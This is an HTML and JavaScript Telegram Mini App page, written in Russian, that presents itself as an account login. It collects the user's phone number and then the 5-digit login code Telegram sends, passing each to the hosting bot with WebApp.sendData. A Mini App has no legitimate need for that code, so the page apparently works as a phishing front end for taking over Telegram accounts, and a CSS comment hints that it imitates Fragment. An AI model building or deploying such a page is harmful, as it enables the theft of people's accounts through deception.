<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в аккаунт</title>
    <!-- Подключение Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Подключение Telegram WebApp SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    
    <style>
        /* Установим шрифт Inter как основной */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        
        :root {
            /* Убедимся, что переменные доступны, если WebApp не установлен (для локального тестирования) */
            --tg-theme-bg-color: #f0f0f0;
            --tg-theme-secondary-bg-color: #ffffff;
            --tg-theme-text-color: #000000;
            --tg-theme-link-color: #2481cc;
            --tg-theme-button-color: #2481cc;
            --tg-theme-button-text-color: #ffffff;
            --tg-theme-hint-color: #999999;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            transition: background-color 0.3s ease;
        }

        /* Стиль для активного поля ввода (фокус) */
        .input-primary:focus {
            border-color: var(--tg-theme-link-color, #2481cc);
            box-shadow: 0 0 0 2px rgba(var(--tg-theme-link-color, #2481cc), 0.5);
        }

        /* Стилизация для лучшего отображения в темной теме Fragment */
        .card-bg {
            background-color: var(--tg-theme-secondary-bg-color, #1c1c1d);
            border: 1px solid var(--tg-theme-hint-color, #2a2a2b30);
        }

        .btn-primary {
            background-color: var(--tg-theme-button-color);
            color: var(--tg-theme-button-text-color);
            transition: opacity 0.2s;
        }

        .btn-primary:hover:not(:disabled) {
            opacity: 0.9;
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        /* Стили для полей кода */
        .code-input {
            width: 48px;
            height: 56px;
            text-align: center;
            font-size: 1.5rem;
            border-radius: 8px;
            border: 2px solid var(--tg-theme-hint-color);
            background-color: var(--tg-theme-bg-color);
            color: var(--tg-theme-text-color);
            transition: border-color 0.2s, box-shadow 0.2s;
        }
    </style>
</head>
<body>
    <div id="app" class="min-h-screen p-4 flex flex-col items-center justify-center">
        <!-- HEADER -->
        <header class="mb-8 text-center">
            <h1 class="text-3xl font-extrabold" style="color: var(--tg-theme-text-color);">
                Вход в аккаунт
            </h1>
            <p class="text-lg" style="color: var(--tg-theme-hint-color);">
                Используйте свой Telegram для входа
            </p>
        </header>

        <!-- MESSAGE CONTAINER -->
        <div id="message-container" class="w-full max-w-md p-4 mb-6 rounded-xl hidden" role="alert">
            <p id="message-text" class="text-sm font-medium"></p>
        </div>

        <!-- PHONE STEP FORM -->
        <div id="phone-step" class="card-bg w-full max-w-md p-6 rounded-xl shadow-lg" style="display: none;">
            <p class="mb-4 text-sm" style="color: var(--tg-theme-hint-color);">
                Шаг 1 из 2: Введите номер телефона
            </p>
            <form id="phone-form" class="space-y-4">
                <div>
                    <input type="tel" id="phone-input" 
                           placeholder="+7 999 123-45-67" 
                           class="w-full p-3 border-2 input-primary rounded-lg text-lg bg-transparent"
                           style="border-color: var(--tg-theme-hint-color); color: var(--tg-theme-text-color);"
                           pattern="^\+\d{1,3}\s?\(\d{3}\)\s?\d{3}-\d{2}-\d{2}$"
                           title="Номер в международном формате, например: +7 (999) 123-45-67"
                           required>
                </div>
                <button type="submit" id="phone-button" 
                        class="btn-primary w-full py-3 rounded-lg font-bold text-lg">
                    Отправить код
                </button>
            </form>
        </div>

        <!-- CODE STEP FORM -->
        <div id="code-step" class="card-bg w-full max-w-md p-6 rounded-xl shadow-lg" style="display: none;">
            <p id="code-prompt" class="mb-6 text-center text-sm" style="color: var(--tg-theme-hint-color);">
                Шаг 2 из 2: Введите 5-значный код, полученный в Telegram.
            </p>
            <form id="code-form" class="space-y-6">
                <div class="flex justify-center space-x-2">
                    <!-- Поля для ввода кода (5 цифр) -->
                    <input type="tel" maxlength="1" class="code-input" data-index="0" required>
                    <input type="tel" maxlength="1" class="code-input" data-index="1" required>
                    <input type="tel" maxlength="1" class="code-input" data-index="2" required>
                    <input type="tel" maxlength="1" class="code-input" data-index="3" required>
                    <input type="tel" maxlength="1" class="code-input" data-index="4" required>
                </div>
                <button type="submit" id="code-button" 
                        class="btn-primary w-full py-3 rounded-lg font-bold text-lg">
                    Подтвердить вход
                </button>
            </form>
        </div>
    </div>

    <script>
        // Глобальные переменные WebApp
        let WebApp = window.Telegram && window.Telegram.WebApp;

        // --- УТИЛИТЫ ---

        /**
         * Отображает сообщение пользователю в WebApp.
         * @param {string} text Текст сообщения.
         * @param {'info'|'error'|'success'} type Тип сообщения.
         */
        function displayMessage(text, type = 'info') {
            const container = document.getElementById('message-container');
            const textElement = document.getElementById('message-text');
            
            // Сброс классов
            container.className = 'w-full max-w-md p-4 mb-6 rounded-xl';
            textElement.className = 'text-sm font-medium';
            container.style.display = 'block';

            let bgColor = '';
            let textColor = '';

            switch (type) {
                case 'error':
                    // Используем стандартные цвета Telegram
                    bgColor = '#f8d7da'; // Светло-красный
                    textColor = '#721c24'; // Темно-красный
                    if (WebApp && WebApp.themeParams.hint_color) {
                         bgColor = 'var(--tg-theme-button-color, #dc3545)';
                         textColor = 'var(--tg-theme-button-text-color, #ffffff)';
                    }
                    break;
                case 'success':
                    bgColor = '#d4edda'; // Светло-зеленый
                    textColor = '#155724'; // Темно-зеленый
                     if (WebApp && WebApp.themeParams.link_color) {
                         bgColor = 'var(--tg-theme-link-color, #28a745)';
                         textColor = 'var(--tg-theme-button-text-color, #ffffff)';
                    }
                    break;
                case 'info':
                default:
                    bgColor = 'var(--tg-theme-secondary-bg-color)';
                    textColor = 'var(--tg-theme-text-color)';
                    break;
            }

            container.style.backgroundColor = bgColor;
            textElement.style.color = textColor;
            textElement.innerText = text;
        }

        /**
         * Переключает видимость между формами.
         * @param {'phone'|'code'|'loading'} step Какой шаг показать.
         */
        function showStep(step) {
            document.getElementById('phone-step').style.display = 'none';
            document.getElementById('code-step').style.display = 'none';
            document.getElementById('message-container').style.display = 'none';

            if (step === 'phone') {
                document.getElementById('phone-step').style.display = 'block';
            } else if (step === 'code') {
                document.getElementById('code-step').style.display = 'block';
            } else if (step === 'loading') {
                 displayMessage('Загрузка...', 'info');
            }
            if (WebApp && WebApp.isExpanded) {
                 WebApp.expand();
            }
        }

        // --- ОБРАБОТЧИКИ ФОРМ ---

        function handlePhoneSubmit(e) {
            e.preventDefault();
            const phoneInput = document.getElementById('phone-input');
            const phoneButton = document.getElementById('phone-button');
            let phone = phoneInput.value.trim().replace(/[\s\(\)-]/g, '');

            if (!phone.startsWith('+')) {
                displayMessage('Номер должен начинаться с международного кода страны, например, +7.', 'error');
                return;
            }

            // Блокируем кнопку и показываем лоадер
            phoneButton.disabled = true;
            phoneButton.innerText = 'Отправка...';
            
            displayMessage('Отправка запроса...');

            const data = {
                step: 'phone',
                phone: phone
            };

            try {
                // *** КРИТИЧЕСКОЕ ИЗМЕНЕНИЕ: Задержка для надежности отправки ***
                // Даем Telegram SDK 100мс на окончательную подготовку
                setTimeout(() => {
                    WebApp.sendData(JSON.stringify(data));
                }, 100); 
                // WebApp закроется после успешного вызова sendData
            } catch (error) {
                // Если sendData немедленно выбрасывает ошибку (например, не инициализировано), 
                // отобразим ее пользователю
                displayMessage('Ошибка при отправке данных в Telegram. Проверьте URL в BotFather.', 'error');
                phoneButton.disabled = false;
                phoneButton.innerText = 'Отправить код';
            }
        }

        function handleCodeSubmit(e) {
            e.preventDefault();
            const codeInputs = Array.from(document.querySelectorAll('#code-form .code-input'));
            const codeButton = document.getElementById('code-button');

            // Собираем код из 5 полей
            const code = codeInputs.map(input => input.value).join('');

            if (code.length !== codeInputs.length) {
                displayMessage(`Пожалуйста, введите ${codeInputs.length}-значный код полностью.`, 'error');
                return;
            }
            if (code.replace(/\D/g, '').length !== codeInputs.length) {
                displayMessage('Код может содержать только цифры.', 'error');
                return;
            }


            // Блокируем кнопку и показываем лоадер
            codeButton.disabled = true;
            codeButton.innerText = 'Подтверждение...';

            displayMessage('Проверка кода...');

            // Отправка данных боту
            const data = {
                step: 'code',
                code: code
            };

            try {
                // *** КРИТИЧЕСКОЕ ИЗМЕНЕНИЕ: Задержка для надежности отправки ***
                 setTimeout(() => {
                    WebApp.sendData(JSON.stringify(data));
                }, 100); 
                // WebApp закроется после успешного вызова sendData
            } catch (error) {
                displayMessage('Ошибка при отправке данных в Telegram: ' + error.message, 'error');
                codeButton.disabled = false;
                codeButton.innerText = 'Подтвердить вход';
            }
        }

        // --- ИНИЦИАЛИЗАЦИЯ ---
        function initWebApp() {
            if (WebApp) {
                WebApp.ready();
                WebApp.expand();

                // Установка цветов
                document.documentElement.style.setProperty('--tg-theme-bg-color', WebApp.themeParams.bg_color);
                document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', WebApp.themeParams.secondary_bg_color);
                document.documentElement.style.setProperty('--tg-theme-text-color', WebApp.themeParams.text_color);
                document.documentElement.style.setProperty('--tg-theme-link-color', WebApp.themeParams.link_color);
                document.documentElement.style.setProperty('--tg-theme-button-color', WebApp.themeParams.button_color);
                document.documentElement.style.setProperty('--tg-theme-button-text-color', WebApp.themeParams.button_text_color);
                document.documentElement.style.setProperty('--tg-theme-hint-color', WebApp.themeParams.hint_color);

                // Получение параметров запуска для определения шага
                const urlParams = new URLSearchParams(WebApp.initDataUnsafe.query_id);
                const step = urlParams.get('step');
                
                if (step === 'code') {
                    showStep('code');
                    // Фокусируемся на первом поле ввода кода
                    document.querySelector('#code-form .code-input').focus();
                } else {
                    // По умолчанию показываем ввод телефона
                    showStep('phone');
                    document.getElementById('phone-input').focus();
                }
            } else {
                // Для локального тестирования без Telegram
                showStep('phone');
                console.error("Telegram WebApp SDK not initialized.");
            }

            // --- ОБРАБОТЧИКИ КНОПОК И ФОРМ ---
            document.getElementById('phone-form').addEventListener('submit', handlePhoneSubmit);
            document.getElementById('code-form').addEventListener('submit', handleCodeSubmit);

             // Обработчик для перемещения фокуса в полях кода
            document.querySelectorAll('.code-input').forEach((input, index, array) => {
                input.addEventListener('input', (e) => {
                    const value = e.target.value;
                    if (value.length === 1 && index < array.length - 1) {
                        array[index + 1].focus();
                    }
                    if (value.length > 1) {
                        e.target.value = value[0]; // Оставляем только первый символ
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        array[index - 1].focus();
                    }
                });
            });
        }

        // Запуск инициализации после загрузки скрипта WebApp
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initWebApp);
        } else {
            initWebApp();
        }
    </script>
</body>
</html>
